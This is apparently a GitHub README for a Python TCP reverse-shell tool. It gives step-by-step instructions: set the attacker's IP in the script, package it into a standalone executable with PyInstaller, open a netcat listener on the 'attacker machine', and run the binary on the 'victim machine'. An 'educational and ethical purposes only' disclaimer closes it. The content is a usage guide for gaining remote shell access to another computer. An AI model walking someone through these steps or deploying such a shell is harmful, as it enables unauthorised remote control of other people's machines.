![version](https://img.shields.io/badge/Version-1.0.7-informational?style=flat&logo=&logoColor=white&color=red) ![stars](https://img.shields.io/github/stars/Keyj33k/ReverseShell?style=social) ![forks](https://img.shields.io/github/forks/Keyj33k/ReverseShell?label=Forks&logo=&logoColor=white&color=blue) ![languages](https://img.shields.io/github/languages/count/Keyj33k/ReverseShell?style=social&logo=&logoColor=white&color=blue) ![issues](https://img.shields.io/github/last-commit/Keyj33k/ReverseShell?style=flat&logo=&logoColor=white&color=blue) ![platform](https://img.shields.io/badge/Platform-Linux-informational?style=flat&logo=&logoColor=white&color=green) 

# Reverse Shell :snake:
- A python3 tcp reverse shell.

![revsh](https://raw.githubusercontent.com/Keyj33k/profiles/main/profile/backd_profile.jpeg)

### :question: How to use this reverseshell? 

- 1 ) Clone the repo:
```
git clone https://github.com/Keyj33k/ReverseShell.git
```
- 2 ) Now you need to navigate to the ReverseShell directory.
```
cd ReverseShell
```
- You will find a file called >> reverseshell.py:

### :wrench: You need to change the ipv4 address in the script:
---
![exa](https://github.com/Keyj33k/profiles/blob/main/profile/revshell.png?raw=true)
---
- 3 ) This Reverse Shell needs requirements you need to install:
```
pip install -r requirements.txt
```
- 4 ) Build an executable using this command:
```
pyinstaller --onefile reverseshell.py
```
- PyInstaller command not found?
```
pip install pyinstaller
```
### :sparkles: If the steps above are done:

- On the attacker machine:
```
nc -lnvp 5003
```
- NC command not found (Debian/-based)?
```
sudo apt-get install -y netcat
```

- On the victim machine:
```
./reverseshell
```
### :gem: Explained:

![listener](https://raw.githubusercontent.com/Keyj33k/profiles/main/profile/reverseshell.jpeg)

# :warning: Note:
- This tool is for educational and ethical purposes only. 
- I'm not responsible for your actions. 
- Don't hack anyone without their permissions.
- With great force follows great responsibility.

---
![pypy](https://raw.githubusercontent.com/Keyj33k/profiles/main/profile/pypy.jpeg)
---
---
  
- Tested on 5.18.0-kali3-amd64, 5.15.0-41-generic-Ubuntu
  
---


